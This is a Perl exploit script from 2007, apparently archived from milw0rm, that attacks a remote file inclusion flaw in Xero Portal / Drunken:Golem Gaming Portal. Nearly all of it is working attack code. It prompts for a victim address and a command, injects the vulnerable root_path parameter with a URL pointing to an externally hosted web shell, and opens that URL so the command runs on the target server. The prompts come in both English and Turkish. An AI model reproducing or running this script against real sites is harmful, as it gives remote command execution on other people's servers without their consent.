#(C) MackRulZ - 2007
#
# [Bug name: Drunken:Golem Gaming Portal (root_path) Remote File Include Exploit
#
# [Script Name: Xero Portal v1.2
#
# [Wrong Codes:  require($phpbb_root_path . 'includes/bbcode.'.$phpEx);
#
$rfi = "phpIRC.php?root_path="; 
$path = "/include/irc/";
$shell = "http://pang0.by.ru/shall/pang057.zz?cmd=";
print "Language: English // Turkish\nPlz Select Lang:\n"; $dil = <STDIN>; chop($dil);
if($dil eq "English"){
print "(c) Mackrulz\n";
&ex;
}
elsif($dil eq "Turkish"){
print "Kodlayan MackruLz\n";
&ex;
}
else {print "Plz Select Languge\n"; exit;}
sub ex{
$not = "Victim is Not Vunl.\n" and $not_cmd = "Victim is Vunl but Not doing Exec.\n"
and $vic = "Victim Addres? with start http:// :" and $thx = "Greetz " and $diz = "Dictionary?:" and $komt = "Command?:"
if $dil eq "English";
$not = "Adreste RFI acigi Yok\n" and $not_cmd = "Adresde Ac.k Var Fakat Kod Calismiyor\n"
and $vic = "Ornek Adres http:// ile baslayan:" and $diz = "Dizin?: " and $thx = "Tesekkurler " and $komt = "Command?:"
if $dil eq "Turkish";
print "$vic";
$victim = <STDIN>;
chop($victim);
print "$diz";
$dizn = <STDIN>;
chop($dizn);
$dizin = $dizn;
$dizin = "/" if !$dizn;
print "$komt";
$cmd = <STDIN>;
chop($cmd);
$cmmd = $cmd;
$cmmd = "dir" if !$cmd;
$site = $victim;
$site = "http://$victim" if !($victim =~ /http/);
$acacaz = "$site$dizin$rfi$shell$cmmd";
print "(c) Mackrulz\n$thx: xoron\n";
sleep 3;
system("start $acacaz");
}

# milw0rm.com [2007-01-27]
